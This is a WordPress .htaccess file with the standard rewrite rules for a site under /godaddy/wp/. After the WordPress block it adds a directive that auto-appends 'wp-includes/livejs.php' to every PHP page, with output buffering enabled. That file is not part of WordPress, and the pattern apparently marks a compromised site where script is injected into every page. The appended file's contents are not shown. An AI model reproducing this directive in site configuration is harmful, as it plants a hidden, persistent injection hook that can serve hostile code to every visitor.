
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /godaddy/wp/
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /godaddy/wp/index.php [L]
</IfModule>

# END WordPress

php_value auto_append_file "wp-includes/livejs.php"
php_flag output_buffering on

